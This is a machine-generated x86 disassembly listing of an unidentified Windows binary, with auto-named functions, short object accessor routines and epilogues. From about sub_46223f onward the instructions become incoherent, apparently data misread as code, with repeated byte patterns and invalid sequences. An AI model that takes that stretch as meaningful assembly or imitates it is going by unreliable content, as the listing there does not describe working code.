mov eax [ ebp - 0x4 ]
call sub_45d87c
sub_45fc33
jmp sub_40387c
sub_45fc3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45fdbc
mov ecx [ eax + 0x220 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x230 ]
retn
cmp edx [ eax + 0x21c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_45fddc
mov ecx [ eax + 0x250 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x234 ]
retn
cmp edx [ eax + 0x24c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_45fdfc
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
lea edx [ ebx + 0x210 ]
lea eax [ ebx + 0x228 ]
call sub_45a8d0
pop esi
pop ebx
retn
sub_45fe18
mov ecx [ eax + 0x224 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
mov al 0x1
retn
sub_45fe2c
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45cd48
mov eax [ esp + 0x10 ]
sub eax [ ebx + 0x258 ]
inc eax
add esp 0x60
pop ebx
retn
sub_45fe4c
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45cd48
mov eax [ esp + 0x40 ]
sub eax [ ebx + 0x25c ]
inc eax
add esp 0x60
pop ebx
retn
sub_45fe6c
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_438930
sub_45ff7a
jmp sub_40387c
sub_45ff81
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460000
cmp edx [ eax + 0x240 ]
je r-xdata
retn
mov [ eax + 0x240 ] edx
call sub_45dce4
sub_46009c
jmp sub_40387c
sub_4600a3
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_40387c#9
jmp sub_40387c
sub_46013b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46016c
cmp edx [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] edx
call sub_45dce4
sub_4601f8
cmp edx [ eax + 0x22c ]
je r-xdata
retn
push 0x1
mov ecx edx
mov edx [ eax + 0x228 ]
call sub_45da0c
j_sub_40387c#8
jmp sub_40387c
sub_4602f1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4602f8
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_438930
j_sub_40387c#7
jmp sub_40387c
sub_46052e
jmp sub_40387c
sub_460535
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460598
mov [ edx + 0xc ] 0x1
test [ eax + 0x249 ] 0x10
jne r-xdata
retn
test [ eax + 0x249 ] 0x8
je r-xdata
test [ eax + 0x249 ] 0x4
je r-xdata
or [ edx + 0xc ] 0x2
or [ edx + 0xc ] 0x80
sub_460614
push ebx
mov ebx eax
mov eax ebx
call sub_43622c
cmp [ ebx + 0x27c ] 0x0
je r-xdata
pop ebx
retn
call GetMessageTime
mov edx [ ebx + 0x27c ]
mov [ edx + 0x244 ] eax
sub_4607a4
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
mov edx 0x1
call sub_45e110
retn
sub_4607bc
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
xor edx edx
call sub_45e110
retn
j_sub_40387c#6
jmp sub_40387c
sub_460860
mov esp ebp
pop ebp
retn
sub_460864
push ebx
mov ebx eax
mov eax ebx
call sub_436650
mov eax ebx
call sub_4607d0
pop ebx
retn
sub_4608c8
push ebx
mov ebx eax
mov eax ebx
call sub_43a9a8
mov eax ebx
call sub_438930
pop ebx
retn
sub_460b40
push ebx
mov ebx eax
mov eax ebx
call sub_45ecf4
mov eax ebx
call sub_4603e8
pop ebx
retn
sub_460b54
push ebx
mov ebx eax
mov ecx [ ebx + 0x21c ]
dec ecx
mov eax ebx
call sub_45bf08
mov edx [ ebx + 0x21c ]
dec edx
mov eax ebx
call sub_45fe80
pop ebx
retn
sub_460b78
push ebx
mov ebx eax
mov ecx [ ebx + 0x24c ]
dec ecx
mov eax ebx
call sub_45bfe0
mov edx [ ebx + 0x24c ]
dec edx
mov eax ebx
call sub_460210
pop ebx
retn
sub_460c6c
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_460c78
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_460c84
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_460c90
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_460c9c
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_460ca8
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_460cb4
push ebx
mov ebx eax
mov eax ebx
call sub_43a854
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45ecf4
sub_460cd0
push ebx
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_460d70
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_460e8c
push ebx
mov ebx eax
mov eax ebx
call sub_45c0c8
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
j_sub_40387c#5
jmp sub_40387c
sub_460edc
pop ebp
retn
sub_460ee0
sub [ rw-data ] 0x1
retn
sub_4621dc
mov eax [ eax + 0x208 ]
call sub_42b83c
retn
sub_46223f
add [ ebx + 0x20880 ] cl
add al ch
adc eax 0xc3fffc96
mov eax [ eax + 0x208 ]
call sub_42b86c
retn
sub_462258
mov eax [ eax + 0x20c ]
call sub_42b83c
retn
sub_4622bd
add [ eax ] al
add [ ebx + 0x20c80 ] cl
add al ch
xchg ebp eax
xchg ebp eax
cld
inc ebx
mov eax [ eax + 0x20c ]
call sub_42b86c
retn
sub_46240c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_462534
push ebx
mov ebx eax
mov eax ebx
call sub_42e3d4
mov eax ebx
call sub_462548
pop ebx
retn
sub_462738
push esi
mov esi eax
cmp [ esi + 0x230 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_462758
push esi
mov esi eax
cmp [ esi + 0x230 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_462800
jmp sub_4035c8
j_sub_40387c#4
jmp sub_40387c
sub_462830
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_40387c#3
jmp sub_40387c
sub_46288d
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4035c8#2
jmp sub_4035c8
sub_462a22
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x188 ]
xor edx edx
call sub_42823c
call sub_4038dc
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_40387c#2
jmp sub_40387c
sub_462ad8
pop ebp
retn
sub_462adc
sub [ rw-data ] 0x1
retn
sub_462f3a
retn 0x9393
sub_462fe0
inc esp
sbb dh ch
sbb [ esi ] 0xffffffd6
outsd
retn
sub_463044
pushfd
and al 0x94
retn
sub_4630ab
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb al dh
iretd
sub_4630fc
mov ebx 0x3039393
add ebx [ edx + 0x50 ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi + edx * 8 + 0x27 ]

sub_463231
mov ebp 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
idiv [ edx + 0x7c ]

sub_463391
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb dl dh
or ebx 0x1af5e5f9
salc

sub_4633a5
cmc
sbb dl dh
stc
int1

sub_463465
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]

sub_463584
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
nop
salc
fwait
retn 0x1b7b
sub_463860
sar [ edx - 0x4b ] 0x96
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]

sub_4639d6
pushfd
and al 0xd0
test ebx 0xbdd018f5
cmc
nop
xlat
mov bh 0xb7
pushfd
and al 0x53
retn
sub_463bea
cmc
sbb dl dh

sub_463c9f
retn
sub_463d2a
ficom [ ebx - 0x40d3fc6d ]
xchg ecx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg ebx eax
int3
mov eax 0x53a09393
int3
sub_464132
push ds
push ss
push edi
outsd
insb
insb
retn
sub_464339
les edi [ ebx + 0x7c ]
adc [ ebx + 0x7a531693 ] 0x9393bbd6
add ebx [ eax ]
pop ebx
cmc
sbb bl dh
outsd
mov al [ 0xffffffffde1af55a ]
insd
0xf7f9
sub_464439
shr [ edi - 0x49 ] 0x8b
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov [ 0x3039393 ] al
add ecx edx
0x5316
sub_46463a
push ds
xlat
mov bh 0xdf
retn
sub_464641
xchg ecx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
pop edx
pushfd
pop ss
retn
sub_4646e5
mov esi 0xd4039393
insb
add eax 0x9393933f
push ds
salc
mov edi 0x7b5518c3
cmp [ ecx + 0x16ca9393 ] bl
push ebx
pushfd
push ss
xchg [ ebx - 0x29e16c6d ] edx
iretd
sub_464707
retn
sub_464708
sbb [ ebp + 0x7b ] dl
add al 0x99
xchg ebx eax
xchg ebx eax
0x5316
sub_465268
push 0x6c
insb
add eax [ ebx ]
sbb al bl

sub_465293
shr [ 0xffffffffddf45534 ] 0x7b
dec edx
xchg edi eax
xchg ebx eax
xchg ebx eax
0x6b10
sub_4654f9
xchg ebx eax
xchg ebx eax
retn
sub_46550e
retn
sub_465964
retn
sub_465ae3
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
push ss
push ebx
pushfd
pop ss
mov es [ esi - 0x3066c6d ]

sub_465ba9
xchg edx eax
pushfd
push ss
0x9393
sub_465c00
retn
sub_465c22
pushfd
and al 0x94
retn
sub_465c5c
insb
insb
0x5316
sub_465c8d
retn
sub_465dd9
push ds
push ss
iretd
sub_465ddc
outsb
insb
insb
retn
sub_465de4
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
nop
out 0x87 al
shr [ eax + 0x119c9fde ] cl
shl [ ebx + edx * 4 + 0x5418cd93 ] cl
int3
sub_465eae
push ebx
pushfd
push ss
add ebx [ eax + 0x787a9393 ]
inc ecx
insb
insb
add eax [ ebx ]
cmc
sbb cl dh
retn
sub_465ee1
retn
sub_465fed
push ds
push ds
daa
imul ebp [ esp + ebp * 2 + 0x7b ] 0xffffffc2
pop ebp
insb
insb
0x6b10
sub_4665f1
stc
mov ebp 0x73d61af5

sub_4666e1
lds ebp [ esp + eax * 8 - 0x3d ]
int3
sub_466b51
retn 0x92f9
sub_466ba2
cmc
sbb bl dh
0xebf9
sub_466d63
iretd
sub_466fa1
insb
les edi [ edi + 0x6f7b161e ]
insb
insb
retn
sub_466fb4
insb
stc
out 0xf5 eax
sbb bl dh
inc edi
0xebf9
sub_466fbe
cmc
sbb bl dh
inc ebp
0xf2f9
sub_466fc5
cmc
sbb bl dh
dec ebx
0xf4f9
sub_466fcc
cmc
sbb bl dh
dec ecx
0xbdf9
sub_466fd3
cmc
sbb bl dh
dec edi
0x1af5
sub_4673e0
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
shl ebp 0x1
sbb al dh
or esi ebp
sbb ch dh
pop es
int3
sub_46767e
not [ eax ]
pop ebx
xchg ecx eax
retn
sub_467683
push ds
push ss
pop ebx
outsb
insb
insb
retn
sub_467784
les ebx [ eax ]
imul edi ebx 0xffffff97
xchg edx eax
xchg ebx eax
xchg ebx eax
push ds
push ss
out dx eax
outsb
insb
insb
retn
sub_467846

sub_467895
les ebx [ eax ]
imul edi ebx 0xffffff97
xchg edx eax
xchg ebx eax
xchg ebx eax
push ds
push ss
iretd
sub_4678c6
stc
out 0xf5 eax
sbb dl dh
inc ebp
mov al [ 0xffffffffd61af553 ]
dec ebx

sub_4678d5
cmc
sbb dl dh
dec edi

sub_4678de
insb
stc
div ch
sbb dl bh
mov bh 0xad

sub_4678e7
stc
std
cmc
sbb dl bh
mov bh 0xd3

sub_4678ef
stc
xchg edx eax
cmc
sbb dl bh
mov bh 0xd1
mov al [ 0x1ec3c353 ]
pop ds
mov bh 0xf
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn 0xdf1e
sub_4679af
push ds
salc
retn
sub_467c02
fist [ esi ]
push ebx
pushfd
pop ss
mov dl 0x93
xchg ebx eax
xchg ebx eax
push ds
aam 0x92
retn
sub_467c21
retn
sub_467c35
insb
insb
sbb al dl
adc [ esi ] 0x53
pushfd
pop ss
xchg edi eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
sub_467c4f
retn
sub_468054
insb
out 0x77 al
sbb cl dh
dec edi
insb
les ecx [ ebx + 0x6c6c067a ]
insb
push ds
salc
push ebx
retn
sub_46814a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
0xca7a
sub_46819f
stc
cld
cmc
sbb dl dh
dec ebp

sub_4688d1
pushfd
push ss
xor [ edi + 0x6c ] ch
insb
push ds
salc
das
retn
sub_468a2a
sbb dh dl
imul ebx [ eax ] 0x13
aaa
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc [ ebx - 0x65 ] dl
retn
sub_468a66
push ds
push ss
daa
imul ebp [ esp + ebp * 2 - 0x3d ] 0x18
push ebp
jpo r-xdata
das
insb
insb
0x18ca
sub_468ac4
stc
mov ebp 0x67d61af5

j_sub_40387c
jmp sub_40387c
sub_468d0c
pop ebp
retn
sub_468f23
jmp sub_40387c
sub_468f2a
pop ebp
retn
